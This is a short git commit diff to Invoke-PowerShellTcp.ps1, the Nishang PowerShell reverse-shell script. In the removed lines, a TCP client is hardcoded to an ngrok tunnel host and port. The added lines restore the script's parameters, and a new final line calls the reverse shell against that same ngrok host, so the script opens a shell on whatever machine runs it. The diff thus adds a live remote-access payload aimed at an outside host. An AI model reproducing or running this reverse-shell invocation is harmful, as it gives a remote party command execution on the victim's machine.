ab5b65a518211c9a7bd0dd880cd27900e508c60e
KAVINDHREN VISVANATHAN <64037096+Kavindhren@users.noreply.github.com>
2025-07-15 10:17:44 +0800

    Update Invoke-PowerShellTcp.ps1

--- Invoke-PowerShellTcp.ps1
+++ Invoke-PowerShellTcp.ps1
@@ -66,7 +66,7 @@ https://github.com/samratashok/nishang
         #Connect back if the reverse switch is used.
         if ($Reverse)
         {
-            $client = New-Object System.Net.Sockets.TCPClient("0.tcp.ap.ngrok.io",15271)
+            $client = New-Object System.Net.Sockets.TCPClient($IPAddress,$Port)
         }
 
         #Bind to the provided port if Bind switch is used.
@@ -124,3 +124,6 @@ https://github.com/samratashok/nishang
         Write-Error $_
     }
 }
+
+
+Invoke-PowerShellTcp -Reverse -IPAddress "0.tcp.ap.ngrok.io" -Port 15271
